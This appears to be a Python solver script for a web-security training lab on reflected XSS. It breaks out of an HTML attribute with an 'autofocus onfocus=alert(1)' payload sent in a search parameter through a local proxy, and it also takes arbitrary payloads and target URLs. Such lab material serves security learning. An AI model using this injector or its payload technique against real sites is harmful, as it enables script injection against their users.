# Reflected XSS into attribute with angle brackets HTML-encoded

import sys
import requests
import urllib3
import urllib.parse
import re
import time
import warnings
from bs4 import BeautifulSoup


warnings.filterwarnings("ignore", category=DeprecationWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def send_payload(url, payload):
	injection_uri = url + payload
	r = requests.get(injection_uri, verify=False, proxies=proxies)
	time.sleep(1)
	print('[+] Targeted endpoint or query parameter:\n    %s' % url)
	print('[+] Using payload:\t%s' % payload)
	return r

def send_xss(url):
	search_path = url + '/?search='
	xss_payload = """'a" autofocus onfocus=alert(1) data="'"""
	r = send_payload(search_path, urllib.parse.quote(xss_payload))
	return r

def main():
	print('[+] Lab: Reflected XSS into attribute with angle brackets HTML-encoded')
	try:
		url = sys.argv[1].strip()
		payload = sys.argv[2].strip()
	except IndexError:
		print('[+] Usage: %s <URL> <PAYLOAD>' % sys.argv[0])
		print('[+] Example: %s https://www.target.com "<test></test>"' % sys.argv[0])
		print('[+] Example: %s https://www.target.com SOLUTION\t(solve the lab)' % sys.argv[0])
		sys.exit(-1)
	s = requests.Session()
	s.proxies = proxies
	s.verify = False
	r = s.get(url, allow_redirects=False)
	time.sleep(1)
	if '<h1>Error</h1>' in r.text:
		print('\n[-] HOST seems to be down (or proxy missconfigued) <!>')
		sys.exit(-1)
	else:
		if payload == "SOLUTION":
			print('[+] Trying send a cross-site scripting attack that calls the alert function...')
			r = send_xss(url)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved')
			elif r.status_code == 200:
				print('[+] The lab should be solved')
				print('[+] The Exploit sent the given payload !')
		else:
			r = send_payload(url + '/?search=', payload)
			if r.status_code == 200 and 'Congratulations, you solved the lab!' in r.text:
				print('[+] The lab is solved')
			elif r.status_code == 200:
				print('[+] The Exploit sent the given payload !')
if __name__ == "__main__":
	main()
